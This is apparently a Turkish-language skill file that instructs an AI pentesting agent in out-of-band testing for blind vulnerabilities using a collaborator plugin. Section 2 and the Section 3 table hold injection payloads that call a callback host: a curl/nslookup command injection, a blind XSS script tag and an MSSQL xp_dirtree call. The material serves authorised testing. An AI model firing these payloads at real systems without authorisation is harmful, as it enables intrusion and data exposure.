---
name: out-of-band-testing
description: >
  Görünür yanıtı olmayan (blind) açıkları KANITLAMA protokolü: Blind SSRF/XSS/SQLi/XXE/RCE,
  deserialization. Birincil OOB collaborator = Cypture QuickSSRF eklentisi (Cypture içi, harici servis
  gerekmez). Benzersiz işaretçi gömme, geri-çağrı (HTTP/DNS) yakalama, negatif kontrol. Blind kanıt katmanı.
---

# 📡 OUT-OF-BAND (OOB) TESTİ — GÖRÜNMEYENİ KANITLA (QuickSSRF ile)

> **Tek cümle:** Bazı açıkların etkisi gönderdiğin yanıtta HİÇ görünmez (blind). Sunucu senin
> kontrolündeki bir adrese DNS/HTTP isteği yapar; sen o geri-çağrıyı yakalarsan açık KANITLANIR.
> "Yanıtta bir şey yok" → "açık yok" DEĞİLDİR. (→ [[data-flow-and-mental-model]] §3)

İlişkili: [[evidence-discipline]] (OOB hit = KANIT), [[engine-mcp-contract]], [[vuln-ssrf]],
[[vuln-xxe]], [[vuln-command-injection]], [[vuln-deserialization]], [[vuln-xss]], [[vuln-sqli]].

---

## 1. OOB KAYNAĞI — Cypture QuickSSRF (birincil)

Bu sistemde OOB collaborator olarak **Cypture QuickSSRF eklentisi** kullanılır — Cypture'nun içindedir,
harici (interactsh/oast) servise gerek YOK. QuickSSRF benzersiz bir callback domaini üretir ve gelen
HTTP/DNS etkileşimlerini Cypture içinde loglar.

```
1. QuickSSRF'ten callback temel domainini al (Cypture'da QuickSSRF sekmesi üretir).
   → Operatör bu domaini başta verir VEYA aktif scope.md "OOB ENDPOINT" alanına yazılır.
   Örnek temel: <rastgele>.quickssrf-host  (gerçek domaini QuickSSRF üretir)
2. Bu domaini aktif firstphase.md'ye "OOB ENDPOINT (QuickSSRF)" diye not düş.
3. Test sırasında payload'lara bu domaini göm; sonra QuickSSRF etkileşim log'unu kontrol et.
```

**Hit doğrulama (QuickSSRF):** Etkileşimler QuickSSRF sekmesinde görünür. MCP üzerinden doğrudan
okunamıyorsa iki yol: (a) operatör QuickSSRF'te hit'i teyit eder, (b) QuickSSRF etkileşimleri Cypture
HTTP geçmişine düşüyorsa `cyp_search_history(pattern="<id>", scope="both")` ile ara.

> **OOB kaynağı yoksa/erişilemiyorsa:** blind testleri "ŞÜPHELİ — OOB doğrulama gerekli" diye işaretle,
> ASLA "hit geldi" diye uydurma. (→ [[evidence-discipline]])

---

## 2. BENZERSİZ İLİŞKİLENDİRME (hangi payload tetikledi?)

Her enjeksiyon noktasına FARKLI bir alt etiket göm ki gelen geri-çağrıyı kaynağına bağlayabilesin:

```
SSRF param  : http://x-<id1>.<quickssrf-domain>
XXE         : http://xxe-<id2>.<quickssrf-domain>
Cmd inj     : ; nslookup cmd-<id3>.<quickssrf-domain>
Blind XSS   : "><script src=//xss-<id4>.<quickssrf-domain>></script>
```

Geri-çağrı geldiğinde `<idN>` sana hangi nokta/payload olduğunu söyler. (→ [[request-economy]]: tek atış, net iz)

---

## 3. SINIF SINIF OOB KANITI

| Sınıf | OOB payload özü | Beklenen geri-çağrı (QuickSSRF) |
|---|---|---|
| **Blind SSRF** | url alanına `http://ssrf-<id>.<domain>` | HTTP/DNS hit (hedef sunucu IP'sinden) |
| **Blind XXE** | external entity → `http://xxe-<id>.<domain>` | HTTP/DNS hit |
| **Blind Cmd Inj** | `; curl http://cmd-<id>.<domain>` / `nslookup` | DNS hit (komut çalıştı) |
| **Blind RCE/Deser** | gadget → OOB istek | HTTP/DNS hit |
| **Blind XSS (stored)** | `<script src=//xss-<id>.<domain>>` admin panelde | Tarayıcı HTTP hit (admin IP/UA) |
| **Blind SQLi (OOB)** | DBMS'e özel (örn. MSSQL `xp_dirtree //sqli-<id>.<domain>`) | DNS/SMB hit |

> Payload'ı Cypture `send_request` ile gönder; ardından QuickSSRF etkileşimini kontrol et (→ [[engine-mcp-contract]]).

---

## 4. DOĞRULAMA KAPISI — OOB hit = güçlü kanıt, ama dikkat

```
[ ] Geri-çağrı GERÇEKTEN geldi mi? (QuickSSRF log'da <id> görünüyor mu?)
[ ] Kaynak IP/zaman tetiklediğin isteğe uyuyor mu? (hedef sunucudan mı geldi?)
[ ] Negatif kontrol: payload GÖNDERMEDEN aynı <id>'ye hit GELMEMELİ (önbellek/tarayıcı değil).
[ ] Tekrar üretilebilir mi? (ikinci benzersiz <id> ile tekrar)
```

Hepsi evet → KANIT. request_id + QuickSSRF etkileşim referansını findings'e yaz. (→ [[evidence-discipline]])

---

## 5. NE ZAMAN OOB'A GEÇ

```
- Görünür etki YOK ama sink OOB-uyumlu (url-fetch / xml / komut / template / deserializer).
- Time-based sinyal belirsiz (ağ gürültüsü şüphesi) → OOB daha kesin kanıt verir.
- Stored bir payload bıraktın ama nerede çalışacağını göremiyorsun (blind XSS).
```

> Token ekonomisi: OOB tek, iyi yerleştirilmiş bir atıştır — kör spam değil. Her enjeksiyon
> noktasına BİR benzersiz işaretçi, sonra QuickSSRF kontrolü. (→ [[attacker-mindset-and-persistence]])

---

## ÖZET — 5 KURAL

1. Blind açık = yanıtta görünmez; Cypture QuickSSRF ile dışarı taşı ve kanıtla.
2. QuickSSRF callback domainini başta al, scope.md'ye yaz; yoksa "ŞÜPHELİ — OOB gerekli" de, uydurma.
3. Her enjeksiyon noktasına benzersiz alt etiket göm — geri-çağrıyı kaynağına bağla.
4. QuickSSRF hit'ini negatif kontrol + tekrar ile doğrula; sonra KANIT olarak kaydet.
5. Tek iyi yerleştirilmiş atış; kör spam değil (token ekonomisi).
